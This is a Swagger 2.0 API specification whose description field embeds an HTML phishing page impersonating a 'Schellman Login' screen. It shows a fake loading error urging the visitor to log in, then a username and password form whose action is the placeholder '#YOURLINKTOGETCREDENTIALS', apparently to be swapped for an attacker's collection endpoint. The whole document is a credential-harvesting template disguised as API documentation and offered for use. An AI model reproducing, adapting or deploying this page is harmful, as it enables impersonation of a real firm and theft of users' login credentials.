swagger: '2.0'
info:
  version: 1.0.0
  title: Schellman Login Page
  description: |
    <div class="login-form" style="font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f5f7fa; padding: 40px 0;">
      
      <!-- Error Message -->
      <div style="width: 100%; max-width: 400px; margin: 20px auto; padding: 20px; background: #f8d7da; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);">
        <div style="background-color: #f8d7da; color: #721c24; padding: 14px 18px; border-radius: 4px; border: 1px solid #f5c6cb; font-size: 15px; text-align: center;">
          <strong>An error occurred while loading, please log in.</strong>
        </div>
      </div>

      <!-- Login Form -->
      <div class="heading">
        <h1 style="text-align: center; font-size: 28px; color: #003366; margin-bottom: 25px; font-weight: 600;">Schellman Login</h1>
        <div class="form-container" style="width: 100%; max-width: 400px; margin: 0 auto; padding: 25px; background: #ffffff; border-radius: 10px; box-shadow: 0 6px 14px rgba(0, 0, 0, 0.08);">
          <form action="#YOURLINKTOGETCREDENTIALS" method="post" class="form-signin">
            
            <div class="form-group" style="margin-bottom: 18px;">
              <label for="username" style="font-size: 14px; color: #333; display: block; margin-bottom: 6px;">Username</label>
              <input type="text" name="username" placeholder="Enter your username" style="width: 100%; padding: 10px 12px; font-size: 15px; border: 1px solid #ccc; border-radius: 5px; transition: border-color 0.3s;" 
                     onfocus="this.style.borderColor='#003366';" onblur="this.style.borderColor='#ccc';">
            </div>

            <div class="form-group" style="margin-bottom: 18px;">
              <label for="password" style="font-size: 14px; color: #333; display: block; margin-bottom: 6px;">Password</label>
              <input type="password" name="password" placeholder="Enter your password" style="width: 100%; padding: 10px 12px; font-size: 15px; border: 1px solid #ccc; border-radius: 5px; transition: border-color 0.3s;" 
                     onfocus="this.style.borderColor='#003366';" onblur="this.style.borderColor='#ccc';">
            </div>

            <div class="form-group" style="margin-top: 25px;">
              <button type="submit" class="btn btn-default" style="width: 100%; padding: 12px; background-color: #003366; border: none; color: white; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: 500; transition: background-color 0.3s;">Login</button>
            </div>
          </form>
        </div>
      </div>

      <!-- Footer -->
      <div style="text-align: center; margin-top: 30px; color: #888; font-size: 12px;">
        © 2025 Schellman. All rights reserved.
      </div>
    </div>
paths:
  /:
    post:
      responses:
        '200':
          description: Login successful
